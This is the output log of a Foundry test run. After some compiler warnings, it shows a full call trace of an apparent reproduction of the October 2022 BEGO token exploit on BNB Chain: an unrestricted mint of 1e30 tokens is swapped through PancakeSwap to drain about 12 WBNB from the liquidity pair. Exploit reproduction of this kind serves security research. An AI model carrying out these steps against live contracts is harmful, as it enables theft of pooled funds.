Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.17s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 291.61ms (183.23µs CPU time)

Ran 1 test for src/test/2022-10/BEGO_exp.sol:ContractTest
[PASS] testExploit() (gas: 164202)
Logs:
  [Start] Attacker WBNB balance before exploit: 0.000000000000000000
  [End] Attacker WBNB balance after exploit: 12.037249252714479992

Traces:
  [186902] ContractTest::testExploit()
    ├─ [2534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_decimal_uint(key: "[Start] Attacker WBNB balance before exploit", val: 0, decimals: 18)
    ├─ [54935] BEGO::mint(1000000000000000000000000000000 [1e30], "t", ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], [], [], [])
    │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 1000000000000000000000000000000 [1e30])
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    ├─ [24687] BEGO::approve(PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   └─ ← [Return] true
    ├─ [519] BEGO::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 1000000000000000000000000000000 [1e30]
    ├─ [87567] PS_ROUTER::swapExactTokensForTokensSupportingFeeOnTransferTokens(1000000000000000000000000000000 [1e30], 0, [0xc342774492b54ce5F8ac662113ED702Fc1b34972, 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1666197272 [1.666e9])
    │   ├─ [11068] BEGO::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], WBNB_BEGO_PAIR: [0x88503F48e437a377f1aC2892cBB3a5b09949faDd], 1000000000000000000000000000000 [1e30])
    │   │   ├─ emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: WBNB_BEGO_PAIR: [0x88503F48e437a377f1aC2892cBB3a5b09949faDd], value: 1000000000000000000000000000000 [1e30])
    │   │   ├─ emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], value: 115792089237316195423570985008687907853269984664640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2893] WBNB_BEGO_PAIR::getReserves() [staticcall]
    │   │   └─ ← [Return] 12037253441575941372 [1.203e19], 347121607271192683478709 [3.471e23], 1666191116 [1.666e9]
    │   ├─ [519] BEGO::balanceOf(WBNB_BEGO_PAIR: [0x88503F48e437a377f1aC2892cBB3a5b09949faDd]) [staticcall]
    │   │   └─ ← [Return] 1000000347121607271192683478709 [1e30]
    │   ├─ [62327] WBNB_BEGO_PAIR::swap(12037249252714479992 [1.203e19], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   │   ├─ [27962] WBNB::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12037249252714479992 [1.203e19])
    │   │   │   ├─ emit Transfer(from: WBNB_BEGO_PAIR: [0x88503F48e437a377f1aC2892cBB3a5b09949faDd], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 12037249252714479992 [1.203e19])
    │   │   │   └─ ← [Return] true
    │   │   ├─ [534] WBNB::balanceOf(WBNB_BEGO_PAIR: [0x88503F48e437a377f1aC2892cBB3a5b09949faDd]) [staticcall]
    │   │   │   └─ ← [Return] 4188861461380 [4.188e12]
    │   │   ├─ [519] BEGO::balanceOf(WBNB_BEGO_PAIR: [0x88503F48e437a377f1aC2892cBB3a5b09949faDd]) [staticcall]
    │   │   │   └─ ← [Return] 1000000347121607271192683478709 [1e30]
    │   │   ├─ emit Sync(reserve0: 4188861461380 [4.188e12], reserve1: 1000000347121607271192683478709 [1e30])
    │   │   ├─ emit Swap(sender: PS_ROUTER: [0x10ED43C718714eb63d5aA57B78B54704E256024E], amount0In: 0, amount1In: 1000000000000000000000000000000 [1e30], amount0Out: 12037249252714479992 [1.203e19], amount1Out: 0, to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   │   └─ ← [Stop] 
    │   ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   │   └─ ← [Return] 12037249252714479992 [1.203e19]
    │   └─ ← [Stop] 
    ├─ [534] WBNB::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   └─ ← [Return] 12037249252714479992 [1.203e19]
    ├─ emit log_named_decimal_uint(key: "[End] Attacker WBNB balance after exploit", val: 12037249252714479992 [1.203e19], decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 498.66ms (3.21ms CPU time)

Ran 2 test suites in 501.63ms (790.27ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
